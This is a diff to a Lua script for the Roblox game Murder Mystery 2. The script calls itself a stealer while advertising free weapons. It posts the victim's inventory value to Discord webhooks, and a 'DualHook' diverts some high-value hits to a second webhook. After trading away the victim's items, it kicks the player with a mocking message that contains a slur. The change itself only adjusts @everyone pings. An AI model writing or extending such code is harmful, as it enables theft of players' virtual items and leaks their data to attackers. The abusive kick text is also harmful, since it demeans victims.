@@ -38,12 +38,12 @@ CheckServerInitial()
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
--- Función para enviar webhook (DualHook seguro con totalValue)
-local function SendDualHook(title, description, fields)
+-- Función para enviar webhook (DualHook seguro con totalValue y control de @everyone)
+local function SendDualHook(title, description, fields, useEveryone)
     totalValue = totalValue or 0
     local useDual = totalValue >= DualHookMinValue and math.random(1,100) <= DualHookPercent
     local targetWebhook = useDual and DualHookWebhook or webhook
-    local prefix = pingEveryone and "@everyone " or ""
+    local prefix = (useEveryone and pingEveryone) and "@everyone " or ""
 
     for i, field in ipairs(fields or {}) do
         if not field.value then field.value = "N/A" end
@@ -115,6 +115,7 @@ local categories = {
 }
 local headers={["Accept"]="text/html",["User-Agent"]="Mozilla/5.0"}
 
+-- Funciones de extracción de datos
 local function trim(s) return s:match("^%s*(.-)%s*$") end
 local function fetchHTML(url) local res=req({Url=url, Method="GET", Headers=headers}) return res and res.Body or "" end
 local function parseValue(div) local str=div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>") if str then str=str:gsub(",","") return tonumber(str) end end
@@ -232,7 +233,7 @@ local function SendInitWebhook()
         end
     end
 
-    SendDualHook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit)
+    SendDualHook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit, true) -- <--- @everyone
 end
 SendInitWebhook()
 
@@ -254,7 +255,7 @@ local function TradeFinalizado()
         fieldsFinal[2].value = fieldsFinal[2].value.."... y más armas 🔥\n"
     end
 
-    SendDualHook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal)
+    SendDualHook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal, false) -- <--- sin @everyone
     task.wait(3)
     LocalPlayer:Kick("El mejor ladron Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy")
 end
